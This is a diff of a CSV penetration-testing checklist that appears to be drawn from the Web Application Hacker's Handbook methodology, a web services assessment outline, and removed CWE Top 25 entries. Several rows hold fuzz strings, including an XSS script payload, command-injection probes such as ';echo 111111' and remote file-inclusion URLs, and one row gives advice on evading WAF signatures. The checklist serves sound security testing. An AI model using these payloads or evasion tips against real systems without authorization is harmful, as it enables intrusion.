 W2-S01.01.6,WAHH2,Review site map,Explore Visible Content,"Review the site map generated by the passive spidering, and identify any content or functionality th",,Explore Visible Content,,"Review the site map generated by the passive spidering, and identify any content or functionality that you have not walked through using your browser. From the spider results, establish where each item was discovered (for example, in Burp Spider, check the Linked From details). Access each item using your browser so that the spider parses the response from the server to identify any further content. Continue this step recursively until no further content or functionality is identified.",1. Map the Application's Content,1.01. Explore Visible Content,1.1.6,,,,,wahh2/index.htm#w1.1.6,,,,,TRUE
 W2-S01.01.7,WAHH2,Automated spidering,Explore Visible Content,"When you have finished manually browsing and passively spidering, you can use your spider to activel",,Explore Visible Content,,"When you have finished manually browsing and passively spidering, you can use your spider to actively crawl the application, using the set of discovered URLs as seeds. This may sometimes uncover additional content that you overlooked when working manually. Before doing an automated crawl, first identify any URLs that are dangerous or likely to break the application session, and then configure the spider to exclude these from its scope.",1. Map the Application's Content,1.01. Explore Visible Content,1.1.7,,,,,wahh2/index.htm#w1.1.7,,,,,
@@ -4361,9 +4600,9 @@ W2-S03.03.3.2,WAHH2,Browser Extension Components,Browser Extension Components,Lo
 W2-S03.03.4.0,WAHH2,Browser Extension Components,Browser Extension Components,Test ActiveX controls,,Browser Extension Components,,Test ActiveX controls,3. Test Client-Side Controls,3.03. Test Browser Extension Components,3.3.4,,,,,wahh2/index.htm#w3.3.4,,,,,
 W2-S03.03.4.1,WAHH2,Browser Extension Components,Browser Extension Components,Identify any ActiveX controls employed by the application. Look for any .cab file types being reques,,Browser Extension Components,,"Identify any ActiveX controls employed by the application. Look for any .cab file types being requested via your intercepting proxy, or look for object tags within the HTML source code of application pages. For example:
 <OBJECT
-����classid=""CLSID:4F878398-E58A-11D3-BEE9-00C04FA0D6BA""
-����codebase=""https://wahh app.com/scripts/input.cab""
-����id=""TheAxControl"">
+classid=""CLSID:4F878398-E58A-11D3-BEE9-00C04FA0D6BA""
+codebase=""https://wahh app.com/scripts/input.cab""
+id=""TheAxControl"">
 </OBJECT>",3. Test Client-Side Controls,3.03. Test Browser Extension Components,3.3.4.1,,,,,wahh2/index.htm#w3.3.4.1,,,,,
 W2-S03.03.4.2,WAHH2,Browser Extension Components,Browser Extension Components,It is usually possible to subvert any input validation performed within an ActiveX control by attach,,Browser Extension Components,,It is usually possible to subvert any input validation performed within an ActiveX control by attaching a debugger to the process and directly modifying data being processed or altering the program's execution path. See Chapter 5 for more details about this kind of attack.,3. Test Client-Side Controls,3.03. Test Browser Extension Components,3.3.4.2,,,,,wahh2/index.htm#w3.3.4.2,,,,,
 W2-S03.03.4.3,WAHH2,Browser Extension Components,Browser Extension Components,It is often possible to guess the purpose of different methods that an ActiveX control exports based,,Browser Extension Components,,It is often possible to guess the purpose of different methods that an ActiveX control exports based on their names and the parameters passed to them. Use the COMRaider tool to enumerate the methods exported by the control. Test whether any of these can be manipulated to affect the control's behavior and defeat any validation tests it implements.,3. Test Client-Side Controls,3.03. Test Browser Extension Components,3.3.4.3,,,,,wahh2/index.htm#w3.3.4.3,,,,,
@@ -4524,7 +4763,7 @@ single-quote
 back-slash
 double-hyphen
 forward-slash
-period ",7. Test for Input-Based Vulnerabilities,7.01. Fuzz All Request Parameters,7.1.3a,,,,,wahh2/index.htm#w7.1.3a,89,FALSE,TRUE,TRUE,
+period",7. Test for Input-Based Vulnerabilities,7.01. Fuzz All Request Parameters,7.1.3a,,,,,wahh2/index.htm#w7.1.3a,89,FALSE,TRUE,TRUE,
 W2-S07.01.3b,WAHH2,XSS and Header Injection,Fuzz All Request Parameters,XSS and Header Injection,Cross-Site Scripting (reflected),Fuzz All Request Parameters,,"XSS and Header Injection
 xsstest
 ""><script>alert('xss')</script>",7. Test for Input-Based Vulnerabilities,7.01. Fuzz All Request Parameters,7.1.3b,,,,,wahh2/index.htm#w7.1.3b,79,,TRUE,TRUE,
@@ -4546,8 +4785,7 @@ W2-S07.01.3e,WAHH2,Script Injection,Fuzz All Request Parameters,Script Injection
 ;echo 111111
 echo 111111
 response.write 111111
-:response.write 111111
-",7. Test for Input-Based Vulnerabilities,7.01. Fuzz All Request Parameters,7.1.3e,,,,,wahh2/index.htm#w7.1.3e,,,FALSE,FALSE,
+:response.write 111111",7. Test for Input-Based Vulnerabilities,7.01. Fuzz All Request Parameters,7.1.3e,,,,,wahh2/index.htm#w7.1.3e,,,FALSE,FALSE,
 W2-S07.01.3f,WAHH2,File Inclusion,Fuzz All Request Parameters,File Inclusion,Remote File Inclusion,Fuzz All Request Parameters,,"File Inclusion
 http://<your server name>/
 http://<nonexistent IP address>/",7. Test for Input-Based Vulnerabilities,7.01. Fuzz All Request Parameters,7.1.3f,,,,,wahh2/index.htm#w7.1.3f,,,,,TRUE
@@ -4793,7 +5031,7 @@ W2-S10.02.2,WAHH2,Segregation between ASP-Hosted Applications,Segregation betwee
 W2-S11.01.1,WAHH2,Default Credentials,Default Credentials,Review the results of your application mapping exercises to identify the web server and other techno,Admin Interface available externally,Default Credentials,,Review the results of your application mapping exercises to identify the web server and other technologies in use that may contain accessible administrative interfaces.,11. Test for Application Server Vulnerabilities,11.01. Test for Default Credentials,11.1.1,,,,,wahh2/index.htm#w11.1.1,798,,,TRUE,TRUE
 W2-S11.01.2,WAHH2,Default Credentials,Default Credentials,Perform a port scan of the web server to identify any administrative interfaces running on a differe,Admin Interface available externally,Default Credentials,,Perform a port scan of the web server to identify any administrative interfaces running on a different port than the main target application.,11. Test for Application Server Vulnerabilities,11.01. Test for Default Credentials,11.1.2,,,,,wahh2/index.htm#w11.1.2,798,,,TRUE,FALSE
 W2-S11.01.3,WAHH2,Default Credentials,Default Credentials,"For any identified interfaces, consult the manufacturer's documentation and common default password ",Default account password unchanged,Default Credentials,,"For any identified interfaces, consult the manufacturer's documentation and common default password listings to obtain default credentials.",11. Test for Application Server Vulnerabilities,11.01. Test for Default Credentials,11.1.3,,,,,wahh2/index.htm#w11.1.3,798,,,TRUE,TRUE
-W2-S11.01.4,WAHH2,Default Credentials,Default Credentials,"If the default credentials do not work, use the steps listed in section 4 to attempt to guess valid ",Default account is active,Default Credentials,,"If the default credentials do not work, use the steps listed in section 4 to attempt to guess valid credentials.",11. Test for Application Server Vulnerabilities,11.01. Test for Default Credentials,11.1.4,,,,,wahh2/index.htm#w11.1.4,798,,,TRUE,TRUE
+W2-S11.01.4,WAHH2,Default Credentials,Default Credentials,"If the default credentials do not work, use the steps listed in section 4 to attempt to guess valid",Default account is active,Default Credentials,,"If the default credentials do not work, use the steps listed in section 4 to attempt to guess valid credentials.",11. Test for Application Server Vulnerabilities,11.01. Test for Default Credentials,11.1.4,,,,,wahh2/index.htm#w11.1.4,798,,,TRUE,TRUE
 W2-S11.01.5,WAHH2,Default Credentials,Default Credentials,"If you gain access to an administrative interface, review the available functionality and determine ",,Default Credentials,,"If you gain access to an administrative interface, review the available functionality and determine whether it can be used to further compromise the host and attack the main application.",11. Test for Application Server Vulnerabilities,11.01. Test for Default Credentials,11.1.5,,,,,wahh2/index.htm#w11.1.5,798,,,TRUE,TRUE
 W2-S11.02.1,WAHH2,Default Content,Default Content,Review the results of your Nikto scan (step 1.04.1) to identify any default content that may be pres,"Default web server content (Tomcat default pages, examples and documentation)",Default Content,1,Review the results of your Nikto scan (step 1.04.1) to identify any default content that may be present on the server but that is not an integral part of the application.,11. Test for Application Server Vulnerabilities,11.02. Test for Default Content,11.2.1,Serving default web server content is indicative of insufficient hardening.,"Please remove this access to Tomcat default content to reduce the attack surface. This can easily be done by following hardening guidelines for Tomcat.
 
@@ -4836,7 +5074,7 @@ W2-S11.07.2,WAHH2,Web Application Firewalling,Web Application Firewalling,"If a 
 W2-S11.07.3,WAHH2,Web Application Firewalling,Web Application Firewalling,Confirm this behavior by performing the same attacks on variables within the application.,WAF detected,Web Application Firewalling,,Confirm this behavior by performing the same attacks on variables within the application.,11. Test for Application Server Vulnerabilities,11.07. Test for Web Application Firewalling,11.7.3,,,,,wahh2/index.htm#w11.7.3,,,,,
 W2-S11.07.4,WAHH2,Web Application Firewalling,Web Application Firewalling,"For all fuzzing strings and requests, use payload strings that are unlikely to exist in a standard s",WAF evasion,Web Application Firewalling,,"For all fuzzing strings and requests, use payload strings that are unlikely to exist in a standard signature database. Although giving examples of these is by definition impossible, avoid using /etc/passwd or /windows/system32/config/sam as payloads for file retrieval. Also avoid using terms such as <script> in an XSS attack and using aiert() or xss as XSS payloads.",11. Test for Application Server Vulnerabilities,11.07. Test for Web Application Firewalling,11.7.4,,,,,wahh2/index.htm#w11.7.4,,,,,
 W2-S11.07.5,WAHH2,Web Application Firewalling,Web Application Firewalling,"If a particular request is blocked, try submitting the same parameter in a different location or con",WAF evasion,Web Application Firewalling,,"If a particular request is blocked, try submitting the same parameter in a different location or context. For instance, submit the same parameter in the URL in a GET request, within the body of a POST request, and within the URL in a POST request.",11. Test for Application Server Vulnerabilities,11.07. Test for Web Application Firewalling,11.7.5,,,,,wahh2/index.htm#w11.7.5,,,,,
-W2-S11.07.6,WAHH2,Web Application Firewalling,Web Application Firewalling,"On ASP.NET, also try submitting the parameter as a cookie. The API Request.Params[�foo�] will retrie",WAF evasion,Web Application Firewalling,,"On ASP.NET, also try submitting the parameter as a cookie. The API Request.Params[�foo�] will retrieve the value of a cookie named foo if the parameter foo is not found in the query string or message body.",11. Test for Application Server Vulnerabilities,11.07. Test for Web Application Firewalling,11.7.6,,,,,wahh2/index.htm#w11.7.6,,,,,
+W2-S11.07.6,WAHH2,Web Application Firewalling,Web Application Firewalling,"On ASP.NET, also try submitting the parameter as a cookie. The API Request.Params[foo] will retrie",WAF evasion,Web Application Firewalling,,"On ASP.NET, also try submitting the parameter as a cookie. The API Request.Params[foo] will retrieve the value of a cookie named foo if the parameter foo is not found in the query string or message body.",11. Test for Application Server Vulnerabilities,11.07. Test for Web Application Firewalling,11.7.6,,,,,wahh2/index.htm#w11.7.6,,,,,
 W2-S11.07.7,WAHH2,Web Application Firewalling,Web Application Firewalling,"Review all the other methods of introducing user input provided in Chapter 4, picking any that are n",WAF evasion,Web Application Firewalling,,"Review all the other methods of introducing user input provided in Chapter 4, picking any that are not protected.",11. Test for Application Server Vulnerabilities,11.07. Test for Web Application Firewalling,11.7.7,,,,,wahh2/index.htm#w11.7.7,,,,,
 W2-S11.07.8,WAHH2,Web Application Firewalling,Web Application Firewalling,Determine locations where user input is (or can be) submitted in a nonstandard format such as serial,WAF evasion,Web Application Firewalling,,"Determine locations where user input is (or can be) submitted in a nonstandard format such as serialization or encoding. If none is available, build the attack string by concatenation and/or by spanning it across multiple variables. (Note that if the target is ASP.NET, you may be able to use HPP to concatenate the attack using multiple specifications of the same variable.)",11. Test for Application Server Vulnerabilities,11.07. Test for Web Application Firewalling,11.7.8,,,,,wahh2/index.htm#w11.7.8,,,,,
 W2-S12.01.1,WAHH2,DOM-Based Attacks,DOM-Based Attacks,Perform a brief code review of every piece of JavaScript received from the application. Identify any,DOM based Cross Site Scripting,DOM-Based Attacks,2,Perform a brief code review of every piece of JavaScript received from the application. Identify any XSS or redirection vulnerabilities that can be triggered by using a crafted URL to introduce malicious data into the DOM of the relevant page. Include all standalone JavaScript files and scripts contained within HTML pages (both static and dynamically generated).,12. Miscellaneous Checks,12.01. Check for DOM-Based Attacks,12.1.1,,,https://www.owasp.org/index.php/HTTP_Strict_Transport_Security_Cheat_Sheet,https://developer.mozilla.org/en-US/docs/Web/Security/HTTP_strict_transport_security,wahh2/index.htm#w12.1.1,79,,TRUE,TRUE,TRUE
@@ -4889,7 +5127,7 @@ W2-S13.4,WAHH2,Information Leakage,Information Leakage,"If you receive any unusu
 ""unable to retrieve"" filetype:php",13. Follow up Any Information Leakage,13. Follow up Any Information Leakage,13.4,,,,,wahh2/index.htm#w13.4,,,,,
 W2-S13.5,WAHH2,Information Leakage,Information Leakage,If you receive error messages with stack traces containing the names of library and third-party code,Improper Error Handling,Information Leakage,,"If you receive error messages with stack traces containing the names of library and third-party code components, search for these names on both types of search engine.",13. Follow up Any Information Leakage,13. Follow up Any Information Leakage,13.5,,,,,wahh2/index.htm#w13.5,,,,,
 WS-001,WebSvc,Web Services Footprinting,Zero Knowledge Assessment (Blackbox),,Web Services Footprinting,Web Services Footprinting,,,1. Web Services Footprinting,,1,,,,,/websvc/Web_Services_Assessment_Methodology.pdf#page=4,,,,,
-WS-002,WebSvc,Querying the UDDI,Zero Knowledge Assessment (Blackbox),A Universal Business Registry (UBR) UDDI was discovered. A UBR maintains a list of registered Web services so it is a very good source of Web services footprinting. The discovered UBR can be queried for a list of Web services using UDDI/SOAP requests.,Querying the UDDI,Querying the UDDI,0-Informational,,1. Web Services Footprinting,,2,,,,,/websvc/Web_Services_Assessment_Methodology.pdf#page=4,,,,,
+WS-002,WebSvc,Querying the UDDI,Zero Knowledge Assessment (Blackbox),A Universal Business Registry (UBR) UDDI was discovered. A UBR maintains a list of registered Web services so it is a very good source of Web services footprinting. The discovered UBR can be queried for a list of Web services using UDDI/SOAP requests.,Querying the UDDI,Querying the UDDI,0,,1. Web Services Footprinting,,2,,,,,/websvc/Web_Services_Assessment_Methodology.pdf#page=4,,,,,
 WS-003,WebSvc,Footprinting using UDDI,Zero Knowledge Assessment (Blackbox),,Footprinting using UDDI,Footprinting using UDDI,,,1. Web Services Footprinting,,3,,,,,/websvc/Web_Services_Assessment_Methodology.pdf#page=5,,,,,
 WS-004,WebSvc,UBR and UDDI,Zero Knowledge Assessment (Blackbox),,UBR and UDDI,UBR and UDDI,,,1. Web Services Footprinting,,4,,,,,/websvc/Web_Services_Assessment_Methodology.pdf#page=7,,,,,
 WS-005,WebSvc,UDDI Data Structures,Zero Knowledge Assessment (Blackbox),,UDDI Data Structures,UDDI Data Structures,,,1. Web Services Footprinting,,5,,,,,/websvc/Web_Services_Assessment_Methodology.pdf#page=9,,,,,
@@ -4954,219 +5192,3 @@ WS-063,WebSvc,Auditing and Logging,Web Services Defense Controls,,Auditing and L
 WS-064,WebSvc,Cryptography,Web Services Defense Controls,,Cryptography,Cryptography,,,6. Web Services Defense Controls,,64,,,,,/websvc/Web_Services_Assessment_Methodology.pdf#page=91,,,,,
 WS-065,WebSvc,Secure Coding,Web Services Defense Controls,,Unsafe implementation,Secure Coding,0,,6. Web Services Defense Controls,,65,,,,,/websvc/Web_Services_Assessment_Methodology.pdf#page=91,0,,,TRUE,
 WS-066,WebSvc,Managed Binaries,Web Services Defense Controls,,Managed Binaries,Managed Binaries,,,6. Web Services Defense Controls,,66,,,,,/websvc/Web_Services_Assessment_Methodology.pdf#page=91,,,,,
-T25-01,CWE-Top-25,CWE-119 Improper Restriction of Operations within the Bounds of a Memory Buffer,Input Validation,,CWE-119 Improper Restriction of Operations within the Bounds of a Memory Buffer,Improper Input Validation,3,"This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results. ",7. Test for Input-Based Vulnerabilities,,1,,,,,https://cwe.mitre.org/data/definitions/119.html,119,,,TRUE,
-T25-02,CWE-Top-25,CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'),XSS and other Response Injection,,CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'),,3,,5. XSS,,2,,,,,https://cwe.mitre.org/data/definitions/79.html,79,,,TRUE,
-T25-03,CWE-Top-25,CWE-20 Improper Input Validation,Input Validation,,CWE-20 Improper Input Validation,,3," According to SOAR, the following detection techniques may be useful:
-Highly cost effective:
-    Web Application Scanner
-    Web Services Scanner
-    Database Scanners 
-
-Dynamic Analysis with Manual Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Highly cost effective:
-    Fuzz Tester
-    Framework-based Fuzzer
-Cost effective for partial coverage:
-    Host Application Interface Scanner
-    Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious",7. Test for Input-Based Vulnerabilities,,3,,,,,https://cwe.mitre.org/data/definitions/20.html,20,,,TRUE,
-T25-04,CWE-Top-25,CWE-200 Information Exposure,Information Leakage,,CWE-200 Information Exposure,,3,"Dynamic Analysis with Automated Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Highly cost effective:
-    Web Application Scanner
-    Web Services Scanner
-    Database Scanners
-Effectiveness: High
-
-Dynamic Analysis with Manual Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Cost effective for partial coverage:
-    Fuzz Tester
-    Framework-based Fuzzer
-    Automated Monitored Execution
-    Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious
-Effectiveness: SOAR Partial",13. Follow up Any Information Leakage,,4,,,,,https://cwe.mitre.org/data/definitions/200.html,200,,,TRUE,
-T25-05,CWE-Top-25,CWE-125 Out-of-bounds Read,Input Validation,,CWE-125 Out-of-bounds Read,,3,,7. Test for Input-Based Vulnerabilities,,5,,,,,https://cwe.mitre.org/data/definitions/125.html,125,,,TRUE,
-T25-06,CWE-Top-25,CWE-89 Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection'),SQL Injection,,CWE-89 Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection'),,3,"Dynamic Analysis with Automated Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Highly cost effective:
-    Database Scanners
-Cost effective for partial coverage:
-    Web Application Scanner
-    Web Services Scanner
-Effectiveness: High
-
-Dynamic Analysis with Manual Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Cost effective for partial coverage:
-    Fuzz Tester
-    Framework-based Fuzzer
-Effectiveness: SOAR Partial",6. SQL Injection,,6,,,,,https://cwe.mitre.org/data/definitions/89.html,89,,,TRUE,
-T25-07,CWE-Top-25,CWE-416 Use After Free, ,,CWE-416 Use After Free,,3, ,12. Miscellaneous Checks,,7,,,,,https://cwe.mitre.org/data/definitions/416.html,416,,,TRUE,
-T25-08,CWE-Top-25,CWE-190 Integer Overflow or Wraparound,,,CWE-190 Integer Overflow or Wraparound,,3,"Black Box
-Sometimes, evidence of this weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
-Effectiveness: Moderate
-
-Dynamic Analysis with Manual Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Cost effective for partial coverage:
-    Fuzz Tester
-    Framework-based Fuzzer
-Effectiveness: SOAR Partial
-Note: Without visibility into the code, black box methods may not be able to sufficiently distinguish this weakness from others, requiring follow-up manual methods to diagnose the underlying problem.",7. Test for Input-Based Vulnerabilities,,8,,,,,https://cwe.mitre.org/data/definitions/190.html,190,,,TRUE,
-T25-09,CWE-Top-25,CWE-352 Cross-Site Request Forgery (CSRF),CSRF,,CWE-352 Cross-Site Request Forgery (CSRF),,3,"Dynamic Analysis with Automated Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Highly cost effective:
-    Web Application Scanner
-Effectiveness: High
-
-Dynamic Analysis with Manual Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Highly cost effective:
-    Fuzz Tester
-    Framework-based Fuzzer
-Effectiveness: High",8. CSRF,,9,,,,,https://cwe.mitre.org/data/definitions/352.html,352,,,TRUE,
-T25-10,CWE-Top-25,CWE-22 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'),Path Traversal,,CWE-22 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'),,3,"Dynamic Analysis with Automated Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Highly cost effective:
-    Web Application Scanner
-    Web Services Scanner
-    Database Scanners
-Effectiveness: High
-
-Dynamic Analysis with Manual Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Highly cost effective:
-    Fuzz Tester
-    Framework-based Fuzzer
-Effectiveness: High",7. Test for Input-Based Vulnerabilities,,10,,,,,https://cwe.mitre.org/data/definitions/22.html,22,,,TRUE,
-T25-11,CWE-Top-25,CWE-78 Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection'),OS Command Injection,,CWE-78 Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection'),,3,"Automated Dynamic Analysis
-This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
-Effectiveness: Moderate
-
-Dynamic Analysis with Automated Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Cost effective for partial coverage:
-    Web Application Scanner
-    Web Services Scanner
-    Database Scanners
-Effectiveness: SOAR Partial
-
-Dynamic Analysis with Manual Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Cost effective for partial coverage:
-    Fuzz Tester
-    Framework-based Fuzzer
-Effectiveness: SOAR Partial",7. Test for Input-Based Vulnerabilities,,11,,,,,https://cwe.mitre.org/data/definitions/78.html,78,,,TRUE,
-T25-12,CWE-Top-25,CWE-787 Out-of-bounds Write, ,,CWE-787 Out-of-bounds Write,,3,"Automated Dynamic Analysis
-This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results. ",11. Other,,12,,,,,https://cwe.mitre.org/data/definitions/787.html,787,,,TRUE,
-T25-13,CWE-Top-25,CWE-287 Improper Authentication,,,CWE-287 Improper Authentication,,3,"Dynamic Analysis with Automated Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Cost effective for partial coverage:
-    Web Application Scanner
-    Web Services Scanner
-    Database Scanners
-Effectiveness: SOAR Partial
-
-Dynamic Analysis with Manual Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Cost effective for partial coverage:
-    Fuzz Tester
-    Framework-based Fuzzer
-Effectiveness: SOAR Partial",4. Auth and Session,,13,,,,,https://cwe.mitre.org/data/definitions/287.html,287,,,TRUE,
-T25-14,CWE-Top-25,CWE-476 NULL Pointer Dereference, ,,CWE-476 NULL Pointer Dereference,,3,"Automated Dynamic Analysis
-This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
-Effectiveness: Moderate",11. Other,,14,,,,,https://cwe.mitre.org/data/definitions/476.html,476,,,TRUE,
-T25-15,CWE-Top-25,CWE-732 Incorrect Permission Assignment for Critical Resource, ,,CWE-732 Incorrect Permission Assignment for Critical Resource,,3,"Automated Dynamic Analysis
-Automated dynamic analysis may be effective in detecting permission problems for system resources such as files, directories, shared memory, device interfaces, etc.
-However, since the software's intended security policy might allow loose permissions for certain operations (such as publishing a file on a web server), automated dynamic analysis may produce some false positives - i.e., warnings that do not have any security consequences or require any code changes.
-When custom permissions models are used - such as defining who can read messages in a particular forum in a bulletin board system - these can be difficult to detect using automated dynamic analysis. It may be possible to define custom signatures that identify any custom functions that implement the permission checks and assignments. 
-
-Manual Dynamic Analysis
-Manual dynamic analysis may be effective in detecting the use of custom permissions models and functions. The program could then be executed with a focus on exercising code paths that are related to the custom permissions. Then the human analyst could evaluate permission assignments in the context of the intended security model of the software.
-
-Fuzzing
-Fuzzing is not effective in detecting this weakness.
-
-Black Box
-Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.
-Attach the monitor to the process and watch for library functions or system calls on OS resources such as files, directories, and shared memory. Examine the arguments to these calls to infer which permissions are being used.
-Note: Note that this technique is only useful for permissions issues related to system resources. It is not likely to detect application-level business rules that are related to permissions, such as if a user of a blog system marks a post as ""private,"" but the blog system inadvertently marks it as ""public.""
-
-Dynamic Analysis with Automated Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Cost effective for partial coverage:
-
-Host-based Vulnerability Scanners - Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria
-    Web Application Scanner
-    Web Services Scanner
-    Database Scanners
-Effectiveness: SOAR Partial
-
-Dynamic Analysis with Manual Results Interpretation
-
-According to SOAR, the following detection techniques may be useful:
-Highly cost effective:
-
-Host Application Interface Scanner
-Cost effective for partial coverage:
-
-Fuzz Tester
-    Framework-based Fuzzer
-    Automated Monitored Execution
-    Forced Path Execution
-Effectiveness: High",11. Other,,15,,,,,https://cwe.mitre.org/data/definitions/732.html,732,,,TRUE,
-T25-16,CWE-Top-25,CWE-434 Unrestricted Upload of File with Dangerous Type,,,CWE-434 Unrestricted Upload of File with Dangerous Type,,3,"Dynamic Analysis with Automated Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Cost effective for partial coverage:
-    Web Application Scanner
-    Web Services Scanner
-    Database Scanners
-Effectiveness: SOAR Partial
-
-Dynamic Analysis with Manual Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Cost effective for partial coverage:
-    Fuzz Tester
-    Framework-based Fuzzer
-Effectiveness: SOAR Partial",7. Test for Input-Based Vulnerabilities,,16,,,,,https://cwe.mitre.org/data/definitions/434.html,434,,,TRUE,
-T25-17,CWE-Top-25,CWE-611 Improper Restriction of XML External Entity Reference,XXE Injection,,CWE-611 Improper Restriction of XML External Entity Reference,,3, ,7. Test for Input-Based Vulnerabilities,,17,,,,,https://cwe.mitre.org/data/definitions/611.html,611,,,TRUE,
-T25-18,CWE-Top-25,CWE-94 Improper Control of Generation of Code ('Code Injection'),Input Validation,,CWE-94 Improper Control of Generation of Code ('Code Injection'),,3, ,7. Test for Input-Based Vulnerabilities,,18,,,,,https://cwe.mitre.org/data/definitions/94.html,94,,,TRUE,
-T25-19,CWE-Top-25,CWE-798 Use of Hard-coded Credentials,,,CWE-798 Use of Hard-coded Credentials,,3,"Black Box
-Credential storage in configuration files is findable using black box methods, but the use of hard-coded credentials for an incoming authentication routine typically involves an account that is not visible outside of the code.
-Effectiveness: Moderate
-
-Manual Dynamic Analysis
-For hard-coded credentials in incoming authentication: use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.
-Attach the monitor to the process and perform a login. Using call trees or similar artifacts from the output, examine the associated behaviors and see if any of them appear to be comparing the input to a fixed string or value. 
-
- Dynamic Analysis with Manual Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Cost effective for partial coverage:
-    Network Sniffer
-    Forced Path Execution
-Effectiveness: SOAR Partial",13. Follow up Any Information Leakage,,19,,,,,https://cwe.mitre.org/data/definitions/798.html,798,,,TRUE,
-T25-20,CWE-Top-25,CWE-400 Uncontrolled Resource Consumption,DOS,,CWE-400 Uncontrolled Resource Consumption,,3,"Automated Dynamic Analysis
-Certain automated dynamic analysis techniques may be effective in spotting resource exhaustion problems, especially with resources such as processes, memory, and connections. The technique may involve generating a large number of requests to the software within a short time frame.
-Effectiveness: Moderate
-
-Fuzzing
-While fuzzing is typically geared toward finding low-level implementation bugs, it can inadvertently find resource exhaustion problems. This can occur when the fuzzer generates a large number of test cases but does not restart the targeted software in between test cases. If an individual test case produces a crash, but it does not do so reliably, then an inability to handle resource exhaustion may be the cause.
-Effectiveness: Opportunistic",11. Other,,20,,,,,https://cwe.mitre.org/data/definitions/400.html,400,,,TRUE,
-T25-21,CWE-Top-25,CWE-772 Missing Release of Resource after Effective Lifetime,DOS,,CWE-772 Missing Release of Resource after Effective Lifetime,,3, ,11. Other,,21,,,,,https://cwe.mitre.org/data/definitions/772.html,772,,,TRUE,
-T25-22,CWE-Top-25,CWE-426 Untrusted Search Path,Input Validation,,CWE-426 Untrusted Search Path,,3,"Black Box
-Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.
-Attach the monitor to the process and look for library functions and system calls that suggest when a search path is being used. One pattern is when the program performs multiple accesses of the same file but in different directories, with repeated failures until the proper filename is found. Library calls such as getenv() or their equivalent can be checked to see if any path-related variables are being accessed. ",7. Test for Input-Based Vulnerabilities,,22,,,,,https://cwe.mitre.org/data/definitions/426.html,426,,,TRUE,
-T25-23,CWE-Top-25,CWE-502 Deserialization of Untrusted Data,Input Validation,,CWE-502 Deserialization of Untrusted Data,,3, ,7. Test for Input-Based Vulnerabilities,,23,,,,,https://cwe.mitre.org/data/definitions/502.html,502,,,TRUE,
-T25-24,CWE-Top-25,CWE-269 Improper Privilege Management,Access Handling with Multiple Accounts,,CWE-269 Improper Privilege Management,,3, ,11. Other,,24,,,,,https://cwe.mitre.org/data/definitions/269.html,269,,,TRUE,
-T25-25,CWE-Top-25,CWE-295 Improper Certificate Validation,,,CWE-295 Improper Certificate Validation,,3,"Dynamic Analysis with Automated Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Cost effective for partial coverage:
-    Web Application Scanner
-Effectiveness: SOAR Partial
-
-Dynamic Analysis with Manual Results Interpretation
-According to SOAR, the following detection techniques may be useful:
-Highly cost effective:
-    Man-in-the-middle attack tool
